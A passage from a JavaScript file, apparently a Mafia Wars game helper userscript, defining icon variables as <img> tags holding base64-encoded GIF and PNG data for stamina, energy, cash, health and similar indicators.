    'AAAQABAAAAVyYBZB0+NITVpdl0VRDDOWZ9qsLYXEs4mqLMtgJyP5bCtLYsgz1oCE5Q6DIVF/twJhMKSOqM+GQrukyqjHhmG8NTOoNJRhraVOq/HDgU7tYnoOenNsUk0lCwKChExFEwuIimSMI4+Qe4tEERmViZeS' +
    'OxkhADs=' +
    '" />';

var staminaIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQANU/ANVbbJmZmkVHRikpKVV5Wq2fnux4itCxt8fIx76WnBYWFjU1NYyNjaVweJOSlNxqdysVF3t6fgcGBnR0daOhp76/vnZze7lcZOaMmq6Bh7KtrpN8hIJCSaCXmIGFi6qurmVjYm1jZGhpapOL' +
    'jHRoa1EpLnJvdt9KUeyQoZ+foLKJkeBpfE5QUO/w8FRJTOJTXpSVmudVZNHR0sdkb91wfICAgIR0d7t3g2VeZamnq7NWXPJugGRWXH9BR4BfXAAAACH5BAEAAD8ALAAAAAAQABAAAAaJwJ9wSCwaj0OJUFBTiByB' +
    'QIohWAxSFeEA8SFUWjJExOKBRSZCBYlAGBU6HQvFQclFhJtXiMVAaDQmA0UDADsJAiA8LjgBCkUJJzE+IgsiCgMTSkMDNAYABJcDCgQOmkI2KwYNggsCLI5FGQ8oKrCmRTcPGAe3Rw0XM7xIQyU9HDrDQxDLvcnO' +
    'QkEAOwo=' +
    '" />';

var updateBadIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAIhSURBVDjLlZPrThNRFIWJicmJz6BWiYbIkYDEG0Jb' +
    'BiitDQgm0PuFXqSAtKXtpE2hNuoPTXwSnwtExd6w0pl2OtPlrphKLSXhx07OZM769qy19wwAGLhM1ddC184+d18QMzoq3lfsD3LZ7Y3XbE5DL6Atzuyilc5Ciyd7IHVfgNcDYTQ2tvDr5crn6uLSvX+Av2Lk36FF' +
    'pSVENDe3OxDZu8apO5rROJDLo30+Nlvj5RnTlVNAKs1aCVFr7b4BPn6Cls21AWgEQlz2+Dl1h7IdA+i97A/geP65WhbmrnZZ0GIJpr6OqZqYAd5/gJpKox4Mg7pD2YoC2b0/54rJQuJZdm6Izcgma4TW1WZ0h+y8' +
    'BfbyJMwBmSxkjw+VObNanp5h/adwGhaTXF4NWbLj9gEONyCmUZmd10pGgf1/vwcgOT3tUQE0DdicwIod2EmSbwsKE1P8QoDkcHPJ5YESjgBJkYQpIEZ2KEB51Y6y3ojvY+P8XEDN7uKS0w0ltA7QGCWHCxSWWpwy' +
    'aCeLy0BkA7UXyyg8fIzDoWHeBaDN4tQdSvAVdU1Aok+nsNTipIEVnkywo/FHatVkBoIhnFisOBoZxcGtQd4B0GYJNZsDSiAEadUBCkstPtN3Avs2Msa+Dt9XfxoFSNYF/Bh9gP0bOqHLAm2WUF1YQskwrVFYPWkf' +
    '3h1iXwbvqGfFPSGW9Eah8HSS9fuZDnS32f71m8KFY7xs/QZyu6TH2+2+FAAAAABJRU5ErkJggg==' +
    '" />';

var processIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADfElEQVR42nWSfUxTZxTGnwtjtIa2l5WFVhCqIwg4pWSyLbBkFcY2M8yYQiQmY200LPtjmTUxQSCsgKsxWVamTlziLDBhH7oxhlhmqWABt2UYhhIg' +
    'VvCGAa0tlUv1UqAfd29r5ka2nX/PeX7v8z7nUPifOlZv1G1/PuNDgSAK/f1DTZXV5Zr/mqMeC+rO00Lhk71UBM9yS5xGKhW1l79XrLzvXkJXl5mdmZneSKYNQqFAueTl3qqq1DJrAI0nf1jQHNhJ+/wB/GQaRFKy' +
    'DGlpKXA4FjHvdsJu/4PNzc2mJRIx2r66wM7OzWbVVFcwjwFnTn1/d1/Z64qhX+9Avj4WklgBxsZsWFn1ITk5Ac9s2oCIyMjwm+0dHWxpye7YNQ709V8YyjS7Dt6ddGJyykY6QSQkyhATsw4POQ/YRRYqlQrBQBCf' +
    'NTY21dVUhjOhTjVcNEjjROpA0EcXlxTA1G1FBBWBVGLf5XIgOjoK2zK3wely4behG8jPz0dnZyeWvN4+2+TUNaq1pZvfu+9VPPB44b7PYmDgF7zw4nZYrb3svNulDXmMj4837Fe/TV+9NoDUjGchEcUgKpJCU+vX' +
    'oC792M/nvpQNp9NDXrTDu8xBLFmHHotZW3XkcEPIZs3R4+qiwp3GUIDORS+SFAosr6yip8cCSl9/tkgkFhpycrMVQd4Pf2AFZJ3oMl3WVlU8AhypPabe8+YbRolYjLkFjoT5BKwDgyzDMJ+GQ9R/dPrgKwU5Brlc' +
    'jpujt5CXp0JrWxs7PWvX+khoclm84f1yDX3ZYkViSjrGJiZg7rFoz31c20DpjzYWbc1MbS8szCPB+DB4/TrZ/2ZsSJBheOQWgjzwnHIrZuz3cKnvZ+QVvAY/uRVTtwk3RkZ3EMBpdeGuHcb0LWmkESR7X4altw+0' +
    'RARFclIYEBJPMHPIeVkFithf9vkxcnMUV8xmTfgLn5/5cjgtPUVpu3ObzcxS0ukZW4jIgSlmGj5CkK1PhEQah2EiGr9tI0cmxej4OGOsO7TxUQb6EwoeAYTu29h8ni8t3QuWW4Gb9YQBghgRVom7tm8v4vihA9Se' +
    'D3Qqf5BnOk7W/n3Kf9VZYwtfXFIMxzyLc80tv0cLhPR+dZniHufDN9+145PD767R/AtQUa3TPRX39DsPOC/NejxZXj9Pp6Zs6p1beMjOOpzNF07U6/45/yfp9IvQT2YsKQAAAABJRU5ErkJggg==' +
    '" />';

var energyPackIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhGAAYAOZ/AFcqAO96APLpzPXHMv3012g2AIZRAvniksS3nue6RHZCAPvoqfjXa9KdAO9pAPO+EbCJKePXw51oAbGVZS8oD2FbR/767NurF/bSXe+UAPPELdOsQ++HANC/q62PTQwIAufEV3JbErF8AOW9' +
    'N49hIfTBG/bZeNvEiubTl/TEJvzsu/DLUtW9cKVyAaJ3MLiEAtq5VfXcjcZ4MbyJAOKtAdmlAO65Dd2oAPn4+PXLP/K/FSUUAO2+ItaiAPLu6+u2CXRoP+PJeOfJZvzwysqVAO/JS6NuBEUdAP745v39/f778LWA' +
    'AOvm4at2APDFQfG8EOaxBMSRAPXy8O9fAKRyDjcyIbSBC////++kALOEGtvMt+izBuK2MOXbt+3iyZ5uG/n39t+tDPHPX+3ALfCjDLOlduvGTcCNAPbhnMueD1hKHd3AZNVNAMKFI+OyD++6AOXPhr+njN3SybiG' +
    'DO/IAI1gAP734fC+Gs+gH6J8AO+sAOPATevSf+Pa0uG0IQAAACH5BAEAAH8ALAAAAAAYABgAAAf/gH+Cg38fVUBlKHATQFUfhJCDHxURFkqXFkgEC2tqj5GCFAgWFpsYAzkmC0NDBxAUoFUCSUMrbjc9uTU1F2so' +
    'fH6whBQCSjE8NTNNEszNLTMsQls7kghKB3c3SxFX3d7eJ0FOeZ8VBAQDP0Qu3Q5T71NsOBEvCSZpAIVdFgw6NEtxrshwQPAdDikkXoQxwaWFITsEcthoIEFKkgABHGTEkeSIgRc3VpgRsQOInQUpoMyYkEQGB4wB' +
    'uiWZ6aXHGDEiAHiwYOJJjRZyrmTgQPQlxita5tS4w2BJgT0WMEyEcKVNhqtDiV5BYIQIFB0YRCgYYYfBxBNXcKhNgPVKHCMN7KA8KVHESAEIBA7woEFEQoEkOLBgIZNkQpMGW57oSMGlzpEQKlSkuyH2ihM9V8B4' +
    'ENHjx5MHDzRcMLCDAgMVGPy96MDkzRUfLqx0/vyghAYrBT58SHMATYobTXzQucLExYwbnkE/SDEawCMAI9BgAN6tz5czN2zQrs2jBQBqhepsiJHgTJIIVKLQ0A5aRwkeuI98+rOjxYYgMNJEabD+gfsSKcBXgHOQ' +
    '7FBHFjAIAYITGqSQwgADiGYEAARGskMBBkCwAQhiiFEEF3hQoQAA8oEiyAc7AFCAAga0OCCFO8xnYiEoHkHhETHKOEggADsK' +
    '" />';

var energyIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhDQANANU/AEs+IPfHHj0zIPesHveqHmhPIPfCHvfAHi8uIfexHve4HktEIPe9HvfEHve7HveoHvfFHiAiIWhZIPeuHiAgIS8wIdqfHqGBH/fWHvfiHve6HlpWIMyYH/fJHve3HsyXH+nGHr6SH/fbHj05' +
    'IOmfHoV0H/ezHlpEIFpPIK+hH/fMHve0Hsy0H9q0HmhUIKGSH6GWH/fKHvfUHvevHtqqHve5HvfPHvepHvfIHve+Hve2HoV9Hz0xIGhYIEs9IP///yH5BAEAAD8ALAAAAAANAA0AAAZgwJ+wMCDcHg8ST8i0JGaT' +
    '4okpdCl0K1OiQBXSGA6NggMA+ATCXsNwOIBrng/61+oEIOtDLkRhLhYoMTh3F11CJTY2KhKGPwgYMiAjjT8vIiwIlBUZKRGUPzA7n0Iboz9BADs=' +
    '" />';

var killedMobsterIcon = '<img src="http://playerscripts.co.uk/images/mwap_graphics/icon_killed.png" />';

var mini_Epak_ready = '<img src="http://playerscripts.co.uk/images/mwap_graphics/bulb_on.png" />';
var mini_Epak_wait =  '<img src="http://playerscripts.co.uk/images/mwap_graphics/bulb_off.png" />';
var m_epak_icon = mini_Epak_wait ;

var yeahIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAGrSURBVDjLvZPZLkNhFIV75zjvYm7VGFNCqoZUJ+ro' +
    'KUUpjRuqp61Wq0NKDMelGGqOxBSUIBKXWtWGZxAvobr8lWjChRgSF//dv9be+9trCwAI/vIE/26gXmviW5bqnb8yUK028qZjPfoPWEj4Ku5HBspgAz941IXZeze8N1bottSo8BTZviVWrEh546EO03EXpuJOdG63' +
    'otJbjBKHkEp/Ml6yNYYzpuezWL4s5VMtT8acCMQcb5XL3eJE8VgBlR7BeMGW9Z4yT9y1CeyucuhdTGDxfftaBO7G4L+zg91UocxVmCiy51NpiP3n2treUPujL8xhOjYOzZYsQWANyRYlU4Y9Br6oHd5bDh0bCpSO' +
    'ixJiWx71YY09J5pM/WEbzFcDmHvwwBu2wnikg+lEj4mwBe5bC5h1OUqcwpdC60dxegRmR06TyjCF9G9z+qM2uCJmuMJmaNZaUrCSIi6X+jJIBBYtW5Cge7cd7sgoHDfDaAvKQGAlRZYc6ltJlMxX03UzlaRlBdQr' +
    'zSCwksLRbOpHUSb7pcsnxCCwngvM2Rm/ugUCi84fycr4l2t8Bb6iqTxSCgNIAAAAAElFTkSuQmCC' +
    '" />';

var plussignIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQALMPAO3r6wxTAGmvZqjQppHFj4O8gANoAACCAJ3JmkqiRzCXLQB3ABGOEl6pWv38/P///yH5BAEAAA8ALAAAAAAQABAAAART8MlJqwUuO2CpG0ghON30hQ1ZPmeRqBSmDYTwahxbEDxRNIyDcKFy' +
    'CI7HBGPBNBiKiigjuHAaAoGi8NDEerMSWcaJ1Wwsjmt5xfrCOg43W3xmsyMAOwo=' +
    '" />';

var cashIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAAAkAAAANCAYAAAB7AEQGAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAZdEVYdFNvZnR3YXJlAFBhaW50Lk5FVCB2My41LjVJivzg' +
    'AAABA0lEQVQoU3XRwUcEURzA8adDhw7xdNpLh6dbp0SX6L+IDp06jG7deqeu6RBLrBppicSOjkk8koqkIYq9zaGVPZSmJUUxfn3fM7LbaPh4v/nOY+YZpfqulswlyPvb73zwPathkd8Xe5IVJ2mnuHC+hU3N9xmN' +
    'FHL3tVtBt2r7ecpCbj92AmYDjdjfP3y2MlV/nHSQ614jYLYw/i3lHKn19kQMuXzZGnDz2uzS58M3raXjBjnkrFuvaL+dOrV6VZuGgYO4zuaA86dGrlbcmCAcldVgo2y+B2r5eDSFIPIbWTWysvmeqKWjEQv5R0YP' +
    'J1WLh8MRYuQQJLDQlV+0sD+UQP4++AGT2OU9X81LRgAAAABJRU5ErkJggg==' +
    '" />';

var cashCubaIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQANU/AMa6tRRvU+Tc1N/X0BX1ALlpih0XF+3i3szDuvHP4Qv1AVclM3BsbCu1J+q50xjVBcaAoMpsmFmYY+LSzO3j2bt1ptqKtXQzUtPGu9rMxLKkm/Pm49Z3qcJcjY1ebrQ7cChYKrtTf85soFWY' +
    'VzCLOguNMMm2q2pTVMCbk1FKSqhEaOWoyALeCJtFXWaHZxzsA9jGwtRvpdLCwdLKxqtidtC0rgTKBYx5euDOyrNce9e/upiYmJI0TuTV0evh2P///yH5BAEAAD8ALAAAAAAQABAAAAaKwJ9wSCwaj8hk0cDzeAzK' +
    'xWeViBQuAZCx9bEkOJBdIKCQLBZDUw0SKkjGrFEl0r6cEIOMhvQo2VwVXg4xNBkYAwMIDQoEDCoiDg4cBT0DAAICigQKABgoOR0dOBszPwwAAA0EBDKYAzoTGwcpRCAPLzA+uj4HBzdHBhoCPhQUBwBKpgg+E1DJ' +
    'z0pBADs=' +
    '" />';

var cashMoscowIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQANU6ACkFBt4aIvFCSdoaIaITGV8LDvNhZq8VG/mtsPbbAChtEekbI8AXHfFITvvIyu8oL/JRV7kWHNwaIfXkAca/E/AwOOcbI8fFJvA4P5iiGfJNU/A0O/NZX/aBhX0PE/V2e9W8Be8tNPFGTL0W' +
    'HcrDBPLPAPNbYeAaIt7bAoMPFIgQFeQbIveanUV5E/JYXmJbD7MVG+zMA22NC9XDD+8kLM0YH4EPE5IRFvA5QJ6rQQAAAAAAAAAAAAAAAAAAAAAAACH5BAEAADoALAAAAAAQABAAAAaMQJ1wSCwaj8hkERAZDABK' +
    'T4Dl0GwIKZsxEvg4DKaGQjFZeQpDQmBDw+RaCtSloQmJbgUGg0DIgGQkc14ILhEETgMMFBMJGRIQCAgGEg8nBwsLNRQJEwcjARIYAQEdBzoABTAzJQkWFRUDAQ8dBlBDLyAxDwK8AgYcaEYAKgsCEBAcFkqnBwI4' +
    'tsvRSUEAOw==' +
    '" />';

var cashBangkokIcon = '<img src="data:image/gif;base64,' +
    'R0lGODlhEAAQANU/ACIGBdl/RV8bFUkOCooZGJtNGsBfIKo4IPvmrcpkE3PNKZUcHZk9D/SJILlGIyBeN9p5Efnah3nNKMpoNGOoMO+USb0/HfKhHtE0G/a9NvS2ImusQO9/HOSPUvGSGu+JRfKyZG6zJ0uLL3AW' +
    'CmC6Jn3KJ3vGKYEbBe+GGYYaG/CJIFypJPOoHvOdJKEpH7k2HTZUHCNoLPSyH5QXDCx3IG60L/SCEfjRapNNILkpC2WZUu6EFtF0LXcSFHYyGgAAACH5BAEAAD8ALAAAAAAQABAAAAaMwJ9wSCwaj8hkEcDAYADK' +
    'EeSGuHByp5mRAckgNK3G46GwjQZDQYGz8+hiD9KmcUGpZoPFQiAQhWgrc14RMgwCB4gLFAoSIgksEREaCQYvBA4OLhQSCgQ+BQkeEAUgBD8AAyk1JRIWExM4BQYgFVBDMCEmBgG8ARUfaEYAPQ4BHR0fFkqnBAE8' +
    'tsvRSUEAOw==' +
    '" />';

var cashVegasIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAZdEVYdFNvZnR3YXJlAFBhaW50Lk5FVCB2My41LjVJivzg' +
    'AAADXklEQVQ4T32TD0zUdRjGv3Ac4N3ujuOPHBweh4eAwCGCwCk1PeQQvI4QEGhB624QFoIDtQzbNO20urRZQEyBjWWsXPZH0k7K4Qbl1hS0stI27I8sMMOO0FVin36zrc3F+m7vvtv7vnve9332PELM8U4csRef' +
    'H3r4vZtX6y7P+urH1ttTTquD1ZuUwXLlXP3/5jISlqbsd6//DPbx5VP5THQ8yC12U+5YxhLTIu7LMI7v3mYsmxOkqqigqPGhmtkKRzGT40188WENRz1rOevJY/tjOdjsaRw95gBcvN0bvesekLX2+JTDnbW3V+VY' +
    'adhSwvG6XIbd+Xz8loOfOrIZeHUFvc4Ufr1Yyuc9Vg6XaGg/oKi9C5K5RBs98FH1+7CDod4H6Gsu5OsTJXBrnTStWopKuJPHneFk3OsSaduZxeSpHKauZ004y0WkePfN4qf7nTmMdhQw0l7I2KH72deTT2mpiTK7' +
    'iQ3ORGxWA7s8iVz4YCGHyqLwTVrZszOV2KiAJnH7l3rv1ICDkwdsvLQxG6ZWUFGVStpSM8mJJuIMRhboYojRG+CajiH3fNZkRCALDCMoQDUovhmtHJ6WiDnXbeNMY6y0shnbSgP2PCM1JQsoWp1AS2006elGmEng' +
    'wjs6qrJDCdeEI4R6QqTELhrOTE7AVZjOqVeSJIAYVlp0LDfrKC+IwGox4CyNwGTSw/VQzruD6HtEwY1pHf3dQRNCpzF45bJYLOmJHGmIg+kQsrLmkxyrZ40ljMykSPIyVQT4R8IVPzwuBXsbtfw8ouDsoP9pYY4P' +
    '315bGc+V7y280bCQQY+aznYVWx/V4tmk5plaDc83KXmyWcXFLhndTyjwdql52SZoqRPNomVrlP7SpcX9M6OL6XpBYn2Vnu+6g+G3QPhd+v8MAF8A48flbFut5GCrUjpTyY0x/2u5ZqG7q4XWF+NTex5XzbZVa7j5' +
    'o4n9di0H60P4pElO32YFHc55PGcJwlWhRakOp8Shwt0qNtyjRt9EkqTT0L+83mjS0qJw5EbwukvFa5tD6HxWw8yYkmUZoRLzIcj8AvfO6Qd8cWkZZvWIEFoUsjDGfgjnq2PzaF3uJ60dyJ4dEutCXvW/jvynGFyu' +
    '0ypOXv1UdvmPEfHtuV5xxtsmtmysFP+x8999db7DTUMcSAAAAABJRU5ErkJggg==' +
    '" />';

var cashItalyIcon = '<img src="data:image/png;base64,' +
	'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAz1JREFUeNpkk19oW2UYxn/n5CRNGtvEZdBuOBK0STeEkpbhpnajYxdWuq6ZBb3w' +
	'wnrjjddeeC1oB+LwRimiVq1EGbL+8aYDEWtrqzKaSour2eJJ1qVrlzRZcpLT5OTk+CXDUfQ7HPheeL/nfd7nfV6J/5y5uVfHvr369YgkEbFMKJWgUICdHab7TjLz5SSTB/Olfy83fr8SWL7x4bWVRTV87nyYmnGE' +
	'hQUVs2ZQM/dx2LdQk7C3R+zMWS59MoH6CGDjz68CS0uXV8vljDcUushPC3/z6ceLWNSxLIvmV68zNOyiUtFYWyP/XD+9X3yOamsAnB9Ufsw9SAW6gy+xe7/M5XfmkW0ST/f4GH3Fj2ka3NvWUdUaoy+3opUN5x8x' +
	'BrJZJuSNjamx9fXvwqGu4WYr2fs6kizh87l5480eQscPERn143AodB5xoTjcPNvvxt1KeHCQMSWVjo00aOh6nrJeJZFII0uyiA0ScaGeoP5YWwvjV05R1vao7udQRH4wBL/9yogtHN78Jth1QYhWJKWWmPhoBZsi' +
	'i7jG8tJdlhfTpFJFTj3jEzpUMcwKRr0icqqktziulERlSzKxuz20H8px4eKTAvke2UyZp4Jt+P0ttHlMHhQTWKZFxdDQi0XBRpATTJTMrokV0oVodkrFEt/PxpHlxnAsbsfz/HWzTrDbxYkTTgzLQC8U2UrDvvBH' +
	'A6HRDtWqoGVlkOqSGJtEa6tCuWzg8dhob3fg9SrYRAEtn2F7R+TvI7yBaAfkvpPnppN3f8Yhu/A8rjH+fhd2u3CAEG9wyMdrr7t5cchFvVZGE1V18disIQoIlxaZVg57j838cL0aOdqZFYgFrkaz5HLVZgsrvxS4' +
	'k7Lo6JBQbFVhODj6xMPqm5vQ3c1M04nvvqesbqzXwv1ng7z9lir0EM8t0aBop+FCEWAKRo2HAwONkcOdLWK3b9HbBJiaej4wf31pVeR4S6XDOFvqdHRaaHqOZALUREMncDrhmB+SSfL9Z+id/Az10TJFoy8E1jbm' +
	'r926SbinD+G8NuEFnaJWE+LB9jbE4wLIIDYU4dIH4weW6eCJRofHZmfnRpCJGBXQtIf/bobp06f/v87/CDAAaTiPaHm8oi8AAAAASUVORK5CYII='
	'" />';

var healthIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsSAAALEgHS3X78AAAAB3RJTUUH1wUIFAADTJ17vgAAAJlJREFUOMvFk7ERwjAMRb84L2ENkhmgyh5p' +
    'WYAFmIExoPQUHiDF9xiiCkeMgu+cIr+z/P30ZZ8FG3rdL/a9Pl+f4vlCSgk5ZwzD9Cmq0h63cWUkaaoqLgAA5nllBwCpAV4C+bfZUoxRQNJ6RdLCJl6qcc0PecJOhWbnul4l2Z3geMDvHSwzHvcKjY4eQEop1hlA' +
    'lr/QdVpV8QYMB23AfeHdZQAAAABJRU5ErkJggg==' +
    '" />';

var healOnIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAAA4AAAAOCAMAAAAolt3jAAAABGdBTUEAALGPC/xhBQAAAwBQTFRFAH8OAX8PA4ARI5EvJJEvI5EwJJEwOJtDQqBMU6ldVKld/v7+/v//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAS0UhugAAAAlwSFlzAAAO' +
    'wgAADsIBFShKgAAAABl0RVh0U29mdHdhcmUAUGFpbnQuTkVUIHYzLjUuNUmK/OAAAABJSURBVBhXY2AAASYgADPAgJUbCJgRXB4eHm42rFwWFhYOkCwHkAE0hRvIhgJuJtK4jOzs7FwgoziBDEaIM3DbC3MkK8LR' +
    'cC8AAM5rBHBrmgyTAAAAAElFTkSuQmCC' +
    '" />';

var healOnHoldIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAAA4AAAAOCAMAAAAolt3jAAAABGdBTUEAALGPC/xhBQAAAwBQTFRF/2oA/2oB/2wD/n8j/n8k/os4/pFC/ZtU/v7+/v//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAnMpvDgAAAAlwSFlzAAAO' +
    'wgAADsIBFShKgAAAABl0RVh0U29mdHdhcmUAUGFpbnQuTkVUIHYzLjUuNUmK/OAAAABGSURBVBhXlY/BCgAgCEOrZer//3Czggjq0DttDOZMKShkiEE1gm3d3erVAmiRNgq2GPXCyp/NIqJRpRR5znjfZYpz5H6h' +
    'A1vyA1TohQLlAAAAAElFTkSuQmCC' +
    '" />';

var healOffIcon = '<img src="data:image/png;base64,' +
    'iVBORw0KGgoAAAANSUhEUgAAAA4AAAAOCAMAAAAolt3jAAAABGdBTUEAALGPC/xhBQAAAwBQTFRF/wAA/wEB/wMD/iQj/iQk/jg4/kNC/VRU/v7+/v//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeLKJyQAAAAlwSFlzAAAO' +
    'wgAADsIBFShKgAAAABl0RVh0U29mdHdhcmUAUGFpbnQuTkVUIHYzLjUuNUmK/OAAAABGSURBVBhXlY/BCgAgCEOrZer//3Czggjq0DttDOZMKShkiEE1gm3d3erVAmiRNgq2GPXCyp/NIqJRpRR5znjfZYpz5H6h' +
    'A1vyA1TohQLlAAAAAElFTkSuQmCC' +
    '" />';

var warningIcon = '<img src="data:image/png;base64,' +
